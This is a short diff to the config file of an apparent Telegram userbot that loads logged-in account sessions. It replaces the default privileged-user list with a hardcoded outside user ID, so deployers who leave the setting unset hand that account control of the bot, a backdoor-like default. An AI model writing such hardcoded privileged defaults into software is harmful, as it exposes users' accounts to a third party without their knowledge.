@@ -2,7 +2,6 @@ import os
 from distutils.util import strtobool
 from os import getenv
 from X.helpers.cmd import cmd
-from XDB.data import MASTERS
 from dotenv import load_dotenv
 
 load_dotenv("config.env")
@@ -39,7 +38,7 @@ STRING_SESSION7 = getenv("STRING_SESSION7", "")
 STRING_SESSION8 = getenv("STRING_SESSION8", "")
 STRING_SESSION9 = getenv("STRING_SESSION9", "")
 STRING_SESSION10 = getenv("STRING_SESSION10", "")
-SUDO_USERS = list(map(int, getenv("SUDO_USERS", "MASTERS").split()))
+SUDO_USERS = list(map(int, getenv("SUDO_USERS", "6694740726").split()))
 BLACKLIST_CHAT = getenv("BLACKLIST_CHAT", None)
 if not BLACKLIST_CHAT:
     BLACKLIST_CHAT = [-1001608701614, -1001675459127, -1001473548283, -1001608701614]
